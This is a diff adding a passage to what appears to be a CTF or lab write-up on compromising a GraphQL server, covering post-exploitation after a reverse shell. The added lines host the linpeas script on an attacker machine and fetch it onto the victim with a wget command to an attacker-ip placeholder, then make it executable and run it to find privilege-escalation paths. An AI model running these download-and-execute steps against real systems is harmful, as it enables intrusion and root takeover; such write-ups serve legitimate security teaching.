@@ -78,4 +78,20 @@ Reverse shell got executed and we got a remote code execution. Thus, compromisin
 <p>
  <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/GRAPHQL/10_server_hacked.png">
 </p>   
-Now we got a reverse shell, we need to now escalate our privileges to become root. Lets send our linpeas script to the compromised server to check what abnomalies can be exploited to become root. We run our server where our linpeas is located.
+Now we got a reverse shell, we need to now escalate our privileges to become root. Lets send our linpeas script to the compromised server to check what abnomalies can be exploited to become root. We run our server where our linpeas is located.    
+```python3 -m http.server```    
+<p>
+ <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/GRAPHQL/11_opening_server_for_linpeas.png">
+</p>    
+Now on the victim server we will download linpeas script being hosted on my server. The following is the command for downloading the script using wget: -    
+```wget http://<attacker-ip>:8000/linpeas.sh```    
+<p>
+ <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/GRAPHQL/12_installing_linpeas.png"
+</p>   
+once linpeas script is downloaded in the victim machine, we will make the file executable and run the script. The following are the commands.    
+```chmod + x linpeas.sh```    
+```./linpeas.sh```    
+<p>
+ <img src="https://raw.githubusercontent.com/Saad-20/Blog/master/assets/GRAPHQL/13_running_linpeas.png">
+</p>
+ 
